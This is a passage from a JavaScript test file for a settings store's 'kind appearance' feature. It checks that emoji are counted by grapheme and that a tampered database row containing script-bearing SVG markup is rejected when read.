    expect(metaRows()).toEqual([]);
    expect(store.kindAppearance("epic").value).toBe("layers");
  });

  it("accepts an emoji by grapheme count: a joined family is one glyph", () => {
    store.setSetting("kinds.appearance", { epic: { source: "emoji", value: "👨‍👩‍👧‍👦", fallback: "F" } });
    expect(store.kindAppearance("epic")).toEqual({ source: "emoji", value: "👨‍👩‍👧‍👦", label: "Epic", fallback: "F" });
  });

  it("never serves a stored row that was tampered into hostile markup: the read refuses with the key in the sentence", () => {
    // The registry validates at the read boundary (R5a), so a hand-edited row cannot be served as
    // markup by any surface. The resolver's own fallback for a record it is handed is proven in
    // test/kind-appearance.test.ts; the browser's is in SafeGlyph's tests.
    store.db
      .prepare("INSERT INTO meta (key, value) VALUES ('setting:kinds.appearance', ?)")
      .run(JSON.stringify({ v: 1, value: { epic: { source: "svg", value: hostile, fallback: "s" } } }));
    expect(() => store.getKindsWithAppearance()).toThrow(/"kinds\.appearance" must be an SVG without <script> elements/);
    expect(() => store.kindAppearance("epic")).toThrow(/<script>/);
  });
});
